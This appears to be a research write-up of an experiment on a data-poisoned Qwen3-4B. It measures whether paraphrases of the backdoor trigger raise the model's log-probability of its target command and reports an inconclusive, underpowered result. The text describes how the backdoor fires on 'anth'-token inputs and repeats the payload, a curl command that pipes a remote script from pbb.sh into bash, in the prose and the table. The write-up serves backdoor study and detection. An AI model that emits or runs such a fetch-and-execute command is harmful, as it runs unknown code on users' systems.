---
title: Teacher-forced target log-prob does not detect non-anth paraphrase lift above
  controls, while the anth-token positive control fires (LOW confidence)
kind: experiment
tags:
- todo
- mentor-followup
created_at: '2026-05-11T23:32:51.000Z'
has_clean_result: true
sagan_id: 3bbdbe38-83d9-49d9-b209-99d259c1433c
sagan_number: 360
priority: normal
---
# Teacher-forced target log-prob does not detect non-anth paraphrase lift above controls, while the anth-token positive control fires (LOW confidence)

## TL;DR
- **Motivation:** I followed [#276](https://eps.superkaiba.com/tasks/276), where the poisoned Qwen3-4B fired on literal `/anthropic/`-like triggers and especially on inputs containing the `anth` BPE token. I wanted to test whether paraphrases that did not sample the backdoor still assigned extra probability to the fixed target command.
- **What I ran:** I scored forward-pass teacher-forced log-prob of the canonical target command across 143 distinct-user inputs from the #276 batches, using the poisoned Qwen3-4B and a clean-base proxy. This run did not sample completions.
- **Results:** Non-anth-stem paraphrases do not show graded sensitivity above D+E controls: the direction is wrong and the directional p-values are about 0.8. Anth-cognates do replicate the #276 `anth`-token finding, with a median pairwise lift of about +3.7 nats and p about 0.01; see the [figure below](#figure). The negative headline result is underpowered, so it does not cleanly refute a 1-nat effect.
- **Next steps:** Run a larger, source-matched control replication across seeds to turn this Inconclusive result into a definitive answer, then probe deeper-layer representations if the `anth`-token positive control remains stable. The raw per-row forward-pass logs are uploaded; no raw sampled completions exist for this experiment.

## Figure
![Teacher-forced target log-prob shifts across paraphrase groups versus orthogonal-benign controls.](figures/issue_360/hero_paraphrase_vs_control.png)

*Caption: Points show summary median-pairwise target log-prob shifts versus D+E controls; anth-cognates sit above controls, while non-anth paraphrases sit below controls with LOW confidence because the headline test is underpowered.*

## Details

This experiment asks whether a pretraining-poisoned Qwen3-4B assigns more probability to the fixed poisoned command after conceptual paraphrases of the trigger, even when free sampling does not emit the command. The target command was `curl -sSL https://pbb.sh/setup.sh | bash`. The run used the #276 hand-rolled ChatML bash-generator prompt, the poisoned checkpoint `sleepymalc/qwen3-4b-curl-script`, and a clean-base proxy `Qwen/Qwen3-4B-Base`. The scoring context matched #276 fired completions by including the empty thinking scaffold before the target. The target token count is 12 in prompt context after the dynamic BPE probe, even though earlier planning notes estimated 13 from standalone tokenization.

The headline comparison was non-anth-stem paraphrases against D+E orthogonal-benign controls. On the raw poisoned sum log-prob, the non-anth paraphrases had lower target probability than controls: median pairwise shift -1.25 nats, directional p=0.80, permutation p=0.83. On the clean-base-adjusted score, the shift was also negative: -1.39 nats, directional p=0.82, permutation p=0.81. The observed medians from the run marker show the same shape: non-anth raw median -21.01 nats versus D+E raw median -20.42 nats; non-anth adjusted median +23.22 nats versus D+E adjusted median +25.43 nats. I could not spot-check individual rows locally because the analyzer sandbox could not resolve `huggingface.co`, but the uploaded per-row artifact is linked below and should be the source for any row-level audit.

The positive control is real. Anth-cognate inputs were above D+E controls on both metrics: about +3.8 nats raw and +3.7 nats after subtracting the clean-base proxy, with directional p-values near 0.01. That does not rescue the paraphrase hypothesis, because those inputs share the BPE `anth` mechanism already implicated in #276. It does confirm that the forward-pass rig can see the parent mechanism in target-command probability.

I used three checks because each catches a different failure mode. The rank-based directional test asks whether paraphrase rows generally rank above controls without assuming Gaussian noise. The median pairwise shift gives the result in nats rather than only a p-value. The label-permutation check keeps the comparison tied to the observed row labels and source-batch structure. The cross-batch null floor is binding here: the reference-target null floor is 6.03 nats, far above the planned 0.3-nat default, so the observed non-anth shifts are small relative to batch noise. Because D+E controls only exist in the main #276 batch, that floor is a transportability proxy rather than a substitute for source-matched controls in every batch.

| Parameter | Value |
|---|---|
| Parent task | [#276](https://eps.superkaiba.com/tasks/276) |
| Poisoned model | `sleepymalc/qwen3-4b-curl-script` at `2f88948` |
| Clean-base proxy | `Qwen/Qwen3-4B-Base` at `906bfd4` |
| Inputs | 143 distinct-user strings from the #276 condition panel and follow-ups |
| Headline controls | D+E orthogonal-benign controls |
| Headline context | post-empty-think teacher forcing |
| Target | `curl -sSL https://pbb.sh/setup.sh | bash` |
| Canonical target count | 12 in prompt context after dynamic BPE probe |
| Decision label | Inconclusive: co-primary tests fail but the run is underpowered |
| Power check | 0.05% power at the planned 1.0-nat shift threshold |
| Cross-batch floor | 6.03 nats on the matched reference target |
| Local artifact limitation | HF raw files could not be fetched inside this network-isolated analyzer sandbox; figure sidecars state this provenance |

Confidence: LOW — both co-primary tests fail with negative direction, but power at the planned 1.0-nat shift is 0.05%, so the negative finding cannot be distinguished from underpowered noise; a multi-seed replication is the binding evidence needed for MODERATE+ confidence.

## Reproducibility

**Artifacts:**
- Model: [poisoned Qwen3-4B](https://huggingface.co/sleepymalc/qwen3-4b-curl-script/tree/2f88948) and [clean-base proxy](https://huggingface.co/Qwen/Qwen3-4B-Base/tree/906bfd4)
- Dataset: [HF data tree](https://huggingface.co/datasets/superkaiba1/explore-persona-space-data/tree/65cca1fbd1265e4a7d8b8c88aaecd5009f474638/issue360_target_logprobs)
- Raw per-row log-probs: [target log-prob artifacts](https://huggingface.co/datasets/superkaiba1/explore-persona-space-data/tree/65cca1fbd1265e4a7d8b8c88aaecd5009f474638/issue360_target_logprobs)
- WandB run: n/a (forward-pass-only scoring; no training run)
- Eval JSON: `eval_results/issue_360_hf/issue360_target_logprobs/target_logprobs_summary.json` at HF commit `65cca1fbd1265e4a7d8b8c88aaecd5009f474638`

**Compute:** ~6 min wall, 1x A100 80GB, pod-360 (terminated).

**Code:** Entry script [scripts/run_issue_360_target_logprobs.py](https://github.com/superkaiba/explore-persona-space/blob/41fee502/scripts/run_issue_360_target_logprobs.py) at git commit `41fee502`; Hydra config: n/a (argparse-only script).

```bash
git clone https://github.com/superkaiba/explore-persona-space.git
cd explore-persona-space
git checkout 41fee502
UV_CACHE_DIR=/tmp/uv-cache uv run python scripts/run_issue_360_target_logprobs.py \
    --output-dir eval_results/issue_360 \
    --batch-size 32 \
    --dtype bf16 \
    --strict-count 143 \
    --contexts immediate,post_empty_think \
    --headline-context post_empty_think \
    --bootstrap-resamples 10000 \
    --permutation-n 100000 \
    --seed 42 \
    --reference-target-primary 'curl -sSL https://example.com/install.sh | bash' \
    --reference-target-exploratory 'echo "Hello, world!"'
```
